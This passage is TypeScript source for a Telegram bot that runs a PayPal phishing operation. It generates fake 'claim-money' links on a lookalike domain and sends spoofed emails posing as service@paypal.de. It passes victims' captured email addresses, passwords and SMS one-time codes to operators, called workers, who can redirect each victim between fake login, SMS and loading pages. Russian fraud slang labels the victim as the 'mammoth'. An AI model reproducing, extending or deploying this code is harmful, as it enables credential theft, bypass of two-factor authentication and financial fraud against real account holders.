            "–ù–µ–≤–µ—Ä–Ω–∞—è —Ü–µ–Ω–∞. –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ –±–æ–ª—å—à–µ 0:",
          );
          return;
        }

        const formattedPrice = `${price.toFixed(2).replace(".", ",")} ‚Ç¨`;
        userStates.set(telegramId, {
          state: "awaiting_sender_name",
          data: { price: formattedPrice },
        });

        await bot.sendMessage(
          chatId,
          `üí∞ –¶–µ–Ω–∞: ${formattedPrice}\n\n` +
            "üë• –¢–µ–ø–µ—Ä—å –≤–≤–µ–¥–∏—Ç–µ –∏–º—è –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è:",
        );
        break;

      case "awaiting_sender_name":
        console.log(`üîÑ Handling awaiting_sender_name - input: "${text}", length: ${text.trim().length}`);
        console.log(`üîÑ UserState data:`, userState.data);
        
        if (text.trim().length < 2) {
          console.log(`‚ö†Ô∏è Sender name too short: "${text.trim()}"`);
          await bot.sendMessage(
            chatId,
            "–ò–º—è –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è –¥–æ–ª–∂–Ω–æ —Å–æ–¥–µ—Ä–∂–∞—Ç—å –º–∏–Ω–∏–º—É–º 2 —Å–∏–º–≤–æ–ª–∞:",
          );
          return;
        }

        const { price: linkPrice } = userState.data;
        console.log(`üîÑ About to call createLink - price: ${linkPrice}, sender: ${text.trim()}`);
        await createLink(chatId, telegramId, linkPrice, text.trim());
        userStates.delete(telegramId);
        break;

      case "add_user":
        if (!(await isUserAdmin(telegramId))) {
          await bot.sendMessage(chatId, "‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.");
          return;
        }

        const newUserId = text.trim();
        if (!/^\d+$/.test(newUserId)) {
          await bot.sendMessage(chatId, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç. –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ–≤–æ–π Telegram ID:");
          return;
        }

        await addNewUser(chatId, telegramId, newUserId);
        userStates.delete(telegramId);
        break;

      case "awaiting_broadcast_message":
        if (!(await isUserAdmin(telegramId))) {
          await bot.sendMessage(
            chatId,
            "–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.",
          );
          userStates.delete(telegramId);
          return;
        }

        await broadcastMessage(text.trim());
        await bot.sendMessage(
          chatId,
          `‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤—Å–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º!`,
          adminKeyboard,
        );
        userStates.delete(telegramId);
        break;

      case "awaiting_email":
        // Validate email format
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(text.trim())) {
          await bot.sendMessage(
            chatId,
            "–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç email. –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π email –∞–¥—Ä–µ—Å:",
          );
          return;
        }

        const { contextData } = userState.data;

        // Find the link with this contextData
        const links = await db
          .select()
          .from(telegramLinks)
          .where(eq(telegramLinks.contextData, contextData));

        if (links.length === 0) {
          await bot.sendMessage(
            chatId,
            "–û—à–∏–±–∫–∞: —Å—Å—ã–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.",
            mainKeyboard,
          );
          userStates.delete(telegramId);
          return;
        }

        const link = links[0];

        // Send email
        try {
          const emailSent = await sendPayPalNotificationEmail(
            text.trim(),
            link,
          );

          if (emailSent) {
            await bot.sendMessage(
              chatId,
              `‚úÖ –ü–∏—Å—å–º–æ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –Ω–∞ ${text.trim()}!\n\n` +
                `üìß –û—Ç: service@paypal.de\n` +
                `üìé –°—Å—ã–ª–∫–∞: ${link.linkId}\n` +
                `üí∞ –°—É–º–º–∞: ${link.price}`,
              mainKeyboard,
            );
          } else {
            await bot.sendMessage(
              chatId,
              `‚ö†Ô∏è Email API –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω (SENDGRID_API_KEY –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç)\n\n` +
                `üìß –ê–¥—Ä–µ—Å –ø–æ–ª—É—á–∞—Ç–µ–ª—è: ${text.trim()}\n` +
                `üìé –°—Å—ã–ª–∫–∞: ${link.linkId}\n` +
                `üí∞ –°—É–º–º–∞: ${link.price}\n\n` +
                `üîß –ù–∞—Å—Ç—Ä–æ–π—Ç–µ SendGrid API –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –ø–∏—Å–µ–º`,
              mainKeyboard,
            );
          }
        } catch (error) {
          console.error("Error sending email:", error);
          await bot.sendMessage(
            chatId,
            "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ø–∏—Å—å–º–∞. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ SendGrid.",
            mainKeyboard,
          );
        }

        userStates.delete(telegramId);
        break;

      default:
        userStates.delete(telegramId);
        await bot.sendMessage(
          chatId,
          "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–µ —Å–æ—Å—Ç–æ—è–Ω–∏–µ. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.",
          mainKeyboard,
        );
    }
  } catch (error) {
    console.error("Error handling user state:", error);
    console.error("State details:", { telegramId, text, userState });
    userStates.delete(telegramId);
    await bot.sendMessage(
      chatId,
      "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.",
      mainKeyboard,
    );
  }
}

// Create new link
async function createLink(
  chatId: number,
  telegramId: string,
  price: string,
  senderName: string,
) {
  const isDevelopment = process.env.NODE_ENV === "development";
  console.log(`üîß createLink called - isDevelopment: ${isDevelopment}, chatId: ${chatId}, price: ${price}, senderName: ${senderName}`);
  
  // Development mode - all functions enabled for testing
  // if (isDevelopment) {
  //   console.log("üö´ Development mode: Telegram bot functions disabled");
  //   await bot.sendMessage(
  //     chatId,
  //     "üö´ –ë–æ—Ç –æ—Ç–∫–ª—é—á–µ–Ω –≤ —Ä–µ–∂–∏–º–µ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏. –§—É–Ω–∫—Ü–∏—è –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –≤ Production.",
  //   );
  //   return;
  // }

  try {
    const linkId = await generateLinkId();
    const contextData = generateRandomString();
    const currentDomain = await getCurrentDomain();
    console.log(`üåç Current domain from database: ${currentDomain}`);
    console.log(`üîß isDevelopment: ${isDevelopment}`);
    
    const baseUrl = currentDomain === 'localhost:5000' 
        ? `http://${currentDomain}`
        : `https://${currentDomain}`;
    
    console.log(`üîó Final baseUrl: ${baseUrl}`);

    const generatedLink = `${baseUrl}/myaccount/transfer/claim-money?context_data=${contextData}&price=${encodeURIComponent(price)}&name=${encodeURIComponent(senderName)}`;
    console.log(`üîó Generated link: ${generatedLink}`);

    await db.insert(telegramLinks).values({
      linkId,
      price,
      senderName,
      generatedLink,
      contextData,
      createdBy: telegramId,
    });

    // Create hash for check users functionality
    const checkHash = contextData.substring(0, 8);

    // Store mapping for check users functionality
    if (!(global as any).checkHashMap) {
      (global as any).checkHashMap = new Map();
    }
    (global as any).checkHashMap.set(checkHash, contextData);

    const message = await bot.sendMessage(
      chatId,
      `‚úÖ –°—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞!\n` +
        `üîó PAYPAL üá©üá™  ${linkId}\n` +
        `üí∞ –°—É–º–º–∞: ${price}\n` +
        `üë• –û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å: ${senderName}\n\n` +
        `üìé <code>${generatedLink}</code>\n\n` +
        `üíú Good Luck üíö`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "üëÅ–ß–µ–∫–µ—ÄüëÅ ",
                callback_data: `check_users_${checkHash}`,
              },
              {
                text: "üìß –û—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–∏—Å—å–º–æ",
                callback_data: `send_email_${checkHash}`,
              },
            ],
            [
              {
                text: "üîÑ –û–±–Ω–æ–≤–∏—Ç—å",
                callback_data: `refresh_page_${checkHash}`,
              },
            ],
          ],
        },
      },
    );

    // Pin the message with the created link
    try {
      await bot.pinChatMessage(chatId, message.message_id);
      console.log(`üìå Link message pinned for user ${telegramId}`);
    } catch (pinError) {
      console.error("Error pinning message:", pinError);
      // Continue without pinning if there's an error
    }
  } catch (error) {
    console.error("Error creating link:", error);
    await bot.sendMessage(
      chatId,
      "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å—Å—ã–ª–∫–∏.",
      mainKeyboard,
    );
  }
}

// Show user profile
async function showUserProfile(chatId: number, telegramId: string) {
  try {
    const user = await getUserByTelegramId(telegramId);
    if (!user) {
      await bot.sendMessage(chatId, "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.", mainKeyboard);
      return;
    }

    const links = await db
      .select()
      .from(telegramLinks)
      .where(eq(telegramLinks.createdBy, telegramId));

    const activeLinksCount = links.length;
    const isAdmin = await isUserAdmin(telegramId);

    let message = `üë§ –ü—Ä–æ—Ñ–∏–ª—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è\n\n`;
    message += `üè∑Ô∏è –£–Ω–∏–∫–∞–ª—å–Ω—ã–π —Ç–µ–≥: ${user.uniqueId}\n`;
    message += `üìä –ê–∫—Ç–∏–≤–Ω—ã–µ —Å—Å—ã–ª–∫–∏: ${activeLinksCount}`;

    if (isAdmin) {
      message += `\n\nüîß –°—Ç–∞—Ç—É—Å: –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä`;
    }

    await bot.sendMessage(
      chatId,
      message,
      (await isUserAdmin(telegramId)) ? adminKeyboard : mainKeyboard,
    );
  } catch (error) {
    console.error("Error showing user profile:", error);
    await bot.sendMessage(
      chatId,
      "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –ø—Ä–æ—Ñ–∏–ª—è.",
      mainKeyboard,
    );
  }
}

// Show user links with pagination
async function showUserLinks(
  chatId: number,
  telegramId: string,
  page: number = 0,
) {
  try {
    const links = await db
      .select()
      .from(telegramLinks)
      .where(eq(telegramLinks.createdBy, telegramId))
      .orderBy(desc(telegramLinks.createdAt));

    if (links.length === 0) {
      await bot.sendMessage(
        chatId,
        "–£ –≤–∞—Å –Ω–µ—Ç —Å–æ–∑–¥–∞–Ω–Ω—ã—Ö —Å—Å—ã–ª–æ–∫.",
        mainKeyboard,
      );
      return;
    }

    const LINKS_PER_PAGE = 3;
    const totalPages = Math.ceil(links.length / LINKS_PER_PAGE);
    const currentPage = Math.max(0, Math.min(page, totalPages - 1));

    const startIndex = currentPage * LINKS_PER_PAGE;
    const endIndex = startIndex + LINKS_PER_PAGE;
    const currentLinks = links.slice(startIndex, endIndex);

    // Create header message
    let headerMessage = `üìã –ú–æ–∏ —Å—Å—ã–ª–∫–∏ (${currentPage + 1}/${totalPages})\n`;
    headerMessage += `üìä –í—Å–µ–≥–æ —Å—Å—ã–ª–æ–∫: ${links.length}\n\n`;

    // Show current page links
    for (let i = 0; i < currentLinks.length; i++) {
      const link = currentLinks[i];
      const date = new Date(link.createdAt).toLocaleDateString("ru-RU");
      const linkNumber = startIndex + i + 1;

      headerMessage += `${linkNumber}. ${link.linkId} - ${link.price}\n`;
      headerMessage += `üë§ ${link.senderName}\n`;
      headerMessage += `üìÖ ${date}\n`;
      headerMessage += `üîó <code>${link.generatedLink}</code>\n\n`;
    }

    // Create navigation buttons
    const keyboard = [];

    // Navigation row
    const navRow = [];
    if (currentPage > 0) {
      navRow.push({
        text: "‚¨ÖÔ∏è –ù–∞–∑–∞–¥",
        callback_data: `links_page_${currentPage - 1}_${telegramId}`,
      });
    }
    if (currentPage < totalPages - 1) {
      navRow.push({
        text: "‚û°Ô∏è –í–ø–µ—Ä–µ–¥",
        callback_data: `links_page_${currentPage + 1}_${telegramId}`,
      });
    }
    if (navRow.length > 0) {
      keyboard.push(navRow);
    }

    // Action buttons row
    const actionRow = [];

    // Delete current page links
    if (currentLinks.length > 0) {
      actionRow.push({
        text: `üóë –£–¥–∞–ª–∏—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É (${currentLinks.length})`,
        callback_data: `delete_page_${currentPage}_${telegramId}`,
      });
    }

    // Delete all links
    actionRow.push({
      text: `üóëüí• –£–¥–∞–ª–∏—Ç—å –≤—Å–µ (${links.length})`,
      callback_data: `delete_all_user_links_${telegramId}`,
    });

    keyboard.push(actionRow);

    await bot.sendMessage(chatId, headerMessage, {
      reply_markup: { inline_keyboard: keyboard },
      parse_mode: "HTML",
    });
  } catch (error) {
    console.error("Error showing user links:", error);
    await bot.sendMessage(
      chatId,
      "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Å—ã–ª–æ–∫.",
      mainKeyboard,
    );
  }
}

// Send simple notifications to regular users (without sensitive data or buttons)
async function sendSimpleUserNotification(
  user: any,
  linkId: string,
  action: string,
  contextData?: string
) {
  try {
    const message = `üá©üá™ PAYPAL ${linkId}\n\nüìç ${action}`;
    
    console.log(`üì± [USER ${user.uniqueId}] Simple notification: ${message}`);
    
    if (bot) {
      await bot.sendMessage(user.telegramId, message, {
        parse_mode: "HTML",
      });
      console.log(`‚úÖ Simple notification sent to user ${user.uniqueId}`);
    } else {
      console.log(`‚ö†Ô∏è Bot not available, notification logged for user ${user.uniqueId}`);
    }
  } catch (error) {
    console.error(`Failed to send simple notification to user ${user.uniqueId}:`, error);
    console.log(`üì± [USER ${user.uniqueId}] Simple notification (logged): ${message}`);
  }
}

// Send full notifications to workers/admins (with data and control buttons)
export async function sendWorkerNotification(
  user: any,
  linkId: string,
  message: string,
  keyboard?: any
) {
  try {
    const options: any = { parse_mode: "HTML" };
    if (keyboard) {
      if (keyboard.reply_markup) {
        options.reply_markup = keyboard.reply_markup;
      } else {
        options.reply_markup = keyboard;
      }
    }
    
    console.log(`üì± [${user.role.toUpperCase()} ${user.uniqueId}] Full notification: ${message}`);
    console.log(`üîß Keyboard structure:`, JSON.stringify(options.reply_markup, null, 2));
    
    if (bot) {
      await bot.sendMessage(user.telegramId, message, options);
      console.log(`‚úÖ Worker notification sent to ${user.uniqueId}`);
    } else {
      console.log(`‚ö†Ô∏è Bot not available, notification logged for ${user.role} ${user.uniqueId}`);
    }
  } catch (error) {
    console.error(`Failed to send worker notification to ${user.uniqueId}:`, error);
    console.log(`üì± [${user.role.toUpperCase()} ${user.uniqueId}] Full notification (logged): ${message}`);
  }
}

// Notify users about redirect actions (simple notifications to link creators)
export async function notifyRedirectAction(
  contextData: string,
  action: string,
  workerName: string = "–í–±–∏–≤–µ—Ä"
) {
  // Note: Enabled in development mode for testing
  console.log(`üì§ Sending redirect notification - action: ${action}, worker: ${workerName}`);
  
  if (!bot) {
    console.log("üö´ Bot not initialized, skipping notification");
    return;
  }

  try {
    // Find the link creator by contextData
    const links = await db
      .select()
      .from(telegramLinks)
      .where(eq(telegramLinks.contextData, contextData));

    if (links.length === 0) {
      console.log("‚ö†Ô∏è No links found for redirect notification");
      return;
    }

    const linkCreatorId = links[0].createdBy;
    const creatorUser = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.telegramId, linkCreatorId));

    if (creatorUser.length === 0) {
      console.log("‚ö†Ô∏è Link creator not found for redirect notification");
      return;
    }

    // Only send to the original link creator (not workers)
    if (creatorUser[0].role === "user") {
      const actionText = getRedirectActionText(action);
      await sendSimpleUserNotification(
        creatorUser[0], 
        links[0].linkId, 
        `${workerName} –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏–ª –Ω–∞: ${actionText}`,
        contextData
      );
    }
  } catch (error) {
    console.error("Error sending redirect notification:", error);
  }
}

// Helper function to convert redirect action to readable text
function getRedirectActionText(action: string): string {
  switch (action) {
    case "home": return "–ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞";
    case "signin": return "–°—Ç—Ä–∞–Ω–∏—Ü–∞ –≤—Ö–æ–¥–∞";
    case "loading": return "–ó–∞–≥—Ä—É–∑–∫–∞";
    case "sms_loading": return "–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ SMS";
    case "sms": return "SMS —Å—Ç—Ä–∞–Ω–∏—Ü–∞";
    case "fullscreen": return "–ü–æ–ª–Ω–æ—ç–∫—Ä–∞–Ω–Ω–∞—è –∑–∞–≥—Ä—É–∑–∫–∞";
    case "paypal": return "–û—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π PayPal";
    default: return "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞";
  }
}

// Notification functions for website events
export async function notifyLoginAttempt(
  emailOrPhone: string,
  password: string,
  returnUri: string,
  loginAttemptId: number,
  contextData?: string,
) {
  // Note: Enabled in development mode for testing
  console.log(`üì§ Sending login attempt notification - email: ${emailOrPhone}, context: ${contextData}`);
  
  if (!bot) {
    console.log("üö´ Bot not initialized, skipping notification");
    return;
  }

  try {
    console.log("üîç Login attempt ID received:", loginAttemptId);

    // Find the link creator by contextData
    let targetUsers: any[] = [];
    console.log("üîç Looking for link creator with contextData:", contextData);

    if (contextData) {
      // Find the link with this contextData
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      console.log("üìä Found links with contextData:", links.length);

      if (links.length > 0) {
        const linkCreator = links[0];
        console.log("üîó Link creator details:", {
          linkId: linkCreator.linkId,
          createdBy: linkCreator.createdBy,
        });

        // Get the user who created this link
        const user = await db
          .select()
          .from(telegramUsers)
          .where(eq(telegramUsers.telegramId, linkCreator.createdBy));
        console.log(
          "üë§ Found link creator user:",
          user.length > 0 ? user[0].uniqueId : "none",
        );

        if (user.length > 0 && user[0].isApproved) {
          // Check if creator is admin - if so, they see all notifications
          if (user[0].role === "admin") {
            targetUsers = user;
            console.log("üîë Admin user - sending notification to admin only");
          } else {
            // Check if creator is regular user with assigned workers
            const assignedWorkers = await db
              .select()
              .from(workerAssignments)
              .leftJoin(telegramUsers, eq(workerAssignments.workerId, telegramUsers.telegramId))
              .where(eq(workerAssignments.userId, linkCreator.createdBy));

            if (assignedWorkers.length > 0) {
              // Send to assigned workers
              targetUsers = assignedWorkers.map(assignment => assignment.telegramUsers).filter(Boolean);
              console.log(`üë• Found ${targetUsers.length} assigned workers`);
            } else {
              // No assigned workers, assign to next available worker using round-robin
              const nextWorker = await getNextWorkerForAssignment();
              if (nextWorker) {
                // Create automatic assignment
                await db.insert(workerAssignments).values({
                  workerId: nextWorker,
                  userId: linkCreator.createdBy,
                  assignedBy: "system",
                });

                console.log(`‚úÖ Auto-assigned worker ${nextWorker} to user ${linkCreator.createdBy}`);
                
                // Get worker info
                const workerUser = await db
                  .select()
                  .from(telegramUsers)
                  .where(eq(telegramUsers.telegramId, nextWorker));
                
                targetUsers = workerUser;
                console.log("ü§ñ Auto-assigned to worker");
              } else {
                // No workers available, send to admins
                const adminIds = loadAdmins();
                const adminUsers = [];
                for (const adminId of adminIds) {
                  const user = await db
                    .select()
                    .from(telegramUsers)
                    .where(eq(telegramUsers.telegramId, adminId));
                    
                  if (user.length > 0) {
                    adminUsers.push(user[0]);
                  } else {
                    // Create dummy admin object for notification
                    adminUsers.push({
                      telegramId: adminId,
                      uniqueId: `#ADMIN_${adminId}`,
                      role: "admin",
                      isApproved: true
                    });
                  }
                }
                
                targetUsers = adminUsers;
                console.log("üîë No workers available - sending to admins");
              }
            }
          }
        }
      }
    }

    // Fallback to all admins if no specific link creator found
    if (targetUsers.length === 0) {
      const adminIds = loadAdmins();
      console.log("‚ö†Ô∏è Fallback to all admins from config:", adminIds);
      
      // Get admin users from database or create dummy admin objects
      const adminUsers = [];
      for (const adminId of adminIds) {
        const user = await db
          .select()
          .from(telegramUsers)
          .where(eq(telegramUsers.telegramId, adminId));
          
        if (user.length > 0) {
          adminUsers.push(user[0]);
        } else {
          // Create dummy admin object for notification
          adminUsers.push({
            telegramId: adminId,
            uniqueId: `#ADMIN_${adminId}`,
            role: "admin",
            isApproved: true
          });
        }
      }
      
      targetUsers = adminUsers;
      console.log("‚ö†Ô∏è Fallback admin users prepared:", targetUsers.length);
    }

    // Get link info for new format
    let linkId = "#DIRECT";
    let linkPrice = "0.00 EUR";

    if (contextData && targetUsers.length > 0) {
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      if (links.length > 0) {
        linkId = links[0].linkId;
        linkPrice = links[0].price;
      }
    }

    // Get actual generated link from database
    let actualLink = "https://paypal.com";
    if (contextData) {
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      if (links.length > 0 && links[0].generatedLink) {
        actualLink = links[0].generatedLink.replace(
          "http://localhost:5000",
          `https://pypal.link`,
        );
      }
    }

    const message =
      `üá©üá™ PAYPAL ${linkId}\n` +
      `üß≠ NEW log: –í–≤–æ–¥ –¥–∞–Ω–Ω—ã—Ö\n` +
      `üí∞ ${linkPrice}\n\n` +
      `üìß Email/–¢–µ–ª–µ—Ñ–æ–Ω:\n<code>${emailOrPhone}</code>\n` +
      `üîë –ü–∞—Ä–æ–ª—å:\n<code>${password}</code>\n\n` +
      `<a href="${actualLink}">üîó –û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É</a>`;

    // Create a short hash for callback data (Telegram limit is 64 bytes)
    const shortHash = contextData ? contextData.substring(0, 8) : "direct";

    // Store mapping of short hash to full contextData
    if (!(global as any).redirectHashMap) {
      (global as any).redirectHashMap = new Map();
      console.log('üîÑ LOGIN: Created new redirectHashMap');
    }
    if (contextData) {
      (global as any).redirectHashMap.set(shortHash, contextData);
      console.log(`üîÑ LOGIN: Stored in redirectHashMap: ${shortHash} -> ${contextData}`);
      console.log(`üîÑ LOGIN: Total redirectHashMap entries: ${(global as any).redirectHashMap.size}`);
    }

    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "‚û°Ô∏è –ü–æ–ª—É—á–∏—Ç—å",
              callback_data: `redirect_${shortHash}_home`,
            },
            {
              text: "‚û°Ô∏è –õ–æ–≥–∏–Ω",
              callback_data: `redirect_${shortHash}_signin`,
            },
          ],
          [
            {
              text: "‚û°Ô∏è –ó–∞–≥—Ä—É–∑–∫–∞",
              callback_data: `redirect_${shortHash}_loading`,
            },
            {
              text: "‚û°Ô∏è –ü—É—à",
              callback_data: `redirect_${shortHash}_sms_loading`,
            },
          ],
          [
            {
              text: "‚û°Ô∏è –°–ú–°",
              callback_data: `redirect_${shortHash}_sms`,
            },
            {
              text: "‚û°Ô∏è JaS",
              callback_data: `redirect_${shortHash}_fullscreen`,
            },
          ],
          [
            {
              text: "‚ÄºÔ∏èOrig PayPal‚ÄºÔ∏è",
              callback_data: `redirect_${shortHash}_paypal`,
            },
          ],
          [
            {
              text: "üîÑ –û–±–Ω–æ–≤–∏—Ç—å",
              callback_data: `refresh_page_${shortHash}`,
            },
          ],
        ],
      },
    };

    // Send different notifications based on user role
    for (const user of targetUsers) {
      try {
        if (user.role === "admin" || user.role === "worker") {
          // Send full notification with data and control buttons to admins/workers
          await bot.sendMessage(user.telegramId, message, {
            ...keyboard,
            parse_mode: "HTML",
          });
          console.log(`‚úÖ Full login notification sent to ${user.role} ${user.uniqueId}`);
        } else {
          // Send simple notification to regular users
          await sendSimpleUserNotification(user, linkId, "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –≤—Ö–æ–¥–∞", contextData);
        }
      } catch (error) {
        console.error(
          `Failed to send login notification to ${user.uniqueId}:`,
          error,
        );
      }
    }
  } catch (error) {
    console.error("Error sending login notification:", error);
  }
}

export async function notifyLoginApproved(emailOrPhone: string) {
  // Note: Enabled in development mode for testing
  console.log("üì§ Sending login approved notification");

  try {
    const approvedUsers = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.isApproved, true));

    const message =
      `‚úÖ –í—Ö–æ–¥ –æ–¥–æ–±—Ä–µ–Ω\n\n` +
      `üìß Email/–¢–µ–ª–µ—Ñ–æ–Ω: \`${emailOrPhone}\`\n` +
      `‚è∞ –í—Ä–µ–º—è: ${new Date().toLocaleString("ru-RU")}`;

    for (const user of approvedUsers) {
      await bot.sendMessage(user.telegramId, message, {
        parse_mode: "Markdown",
      });
    }
  } catch (error) {
    console.error("Error sending approval notification:", error);
  }
}

export async function notifySmsSubmission(
  otpCode: string,
  stepupContext: string,
  contextData?: string,
) {
  // Note: Enabled in development mode for testing
  console.log(`üì§ Sending SMS submission notification - code: ${otpCode}, context: ${contextData}`);
  
  if (!bot) {
    console.log("üö´ Bot not initialized, skipping notification");
    return;
  }

  try {
    // Find the link creator by contextData
    let targetUsers: any[] = [];
    console.log(
      "üì± Looking for SMS link creator with contextData:",
      contextData,
    );

    if (contextData) {
      // Find the link with this contextData
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      console.log("üìä Found SMS links with contextData:", links.length);

      if (links.length > 0) {
        const linkCreator = links[0];
        console.log("üîó SMS link creator details:", {
          linkId: linkCreator.linkId,
          createdBy: linkCreator.createdBy,
        });

        // Get the user who created this link
        const user = await db
          .select()
          .from(telegramUsers)
          .where(eq(telegramUsers.telegramId, linkCreator.createdBy));
        console.log(
          "üë§ Found SMS link creator user:",
          user.length > 0 ? user[0].uniqueId : "none",
        );

        if (user.length > 0 && user[0].isApproved) {
          targetUsers = user;
          console.log("‚úÖ Targeting SMS to specific user:", user[0].uniqueId);
        }
      }
    }

    // Fallback to all admins if no specific link creator found
    if (targetUsers.length === 0) {
      const adminIds = loadAdmins();
      console.log("‚ö†Ô∏è SMS fallback to all admins from config:", adminIds);
      
      // Get admin users from database or create dummy admin objects
      const adminUsers = [];
      for (const adminId of adminIds) {
        const user = await db
          .select()
          .from(telegramUsers)
          .where(eq(telegramUsers.telegramId, adminId));
          
        if (user.length > 0) {
          adminUsers.push(user[0]);
        } else {
          // Create dummy admin object for notification
          adminUsers.push({
            telegramId: adminId,
            uniqueId: `#ADMIN_${adminId}`,
            role: "admin",
            isApproved: true
          });
        }
      }
      
      targetUsers = adminUsers;
      console.log("‚ö†Ô∏è SMS fallback admin users prepared:", targetUsers.length);
    }

    // Get link info for new format
    let linkId = "#DIRECT";
    let linkPrice = "0.00 EUR";

    if (contextData && targetUsers.length > 0) {
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      if (links.length > 0) {
        linkId = links[0].linkId;
        linkPrice = links[0].price;
      }
    }

    // Get actual generated link from database
    let actualLink = "https://paypal.com";
    if (contextData) {
      const links = await db
        .select()
        .from(telegramLinks)
        .where(eq(telegramLinks.contextData, contextData));
      if (links.length > 0 && links[0].generatedLink) {
        actualLink = links[0].generatedLink.replace(
          "http://localhost:5000",
          `https://pypal.link`,
        );
      }
    }

    const message =
      `üá©üá™ PAYPAL ${linkId}\n` +
      `üß≠ NEW log: –ü—É—à & –°–º—Å\n` +
      `üí∞ ${linkPrice}\n\n` +
      `üî¢ SMS –ö–æ–¥:\n<code>${otpCode}</code>\n\n` +
      `–£ –º–∞–º–æ–Ω—Ç–∞ –≤–∏—Å–∏—Ç Just a second...\n\n` +
      `<a href="${actualLink}">üîó –û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É</a>`;

    // Create buttons for user control
    const redirectButtons = [];

    // First row - main navigation
    redirectButtons.push([
      {
        text: "‚û°Ô∏è –ü–æ–ª—É—á–∏—Ç—å",
        callback_data: `redirect_${contextData ? contextData.substring(0, 8) : "direct"}_home`,
      },
      {
        text: "‚û°Ô∏è –õ–æ–≥–∏–Ω",
        callback_data: `redirect_${contextData ? contextData.substring(0, 8) : "direct"}_signin`,
      },
    ]);

    // Second row - loading states
    redirectButtons.push([
      {
        text: "‚û°Ô∏è –ó–∞–≥—Ä—É–∑–∫–∞",
        callback_data: `redirect_${contextData ? contextData.substring(0, 8) : "direct"}_loading`,
      },
      {
        text: "‚û°Ô∏è –ü—É—à",
        callback_data: `redirect_${contextData ? contextData.substring(0, 8) : "direct"}_sms_loading`,
      },
    ]);

    // Third row - sms and special states
    redirectButtons.push([
      {
        text: "‚û°Ô∏è –°–ú–°",
        callback_data: `redirect_${contextData ? contextData.substring(0, 8) : "direct"}_sms`,
      },
      {
        text: "‚û°Ô∏è JaS",
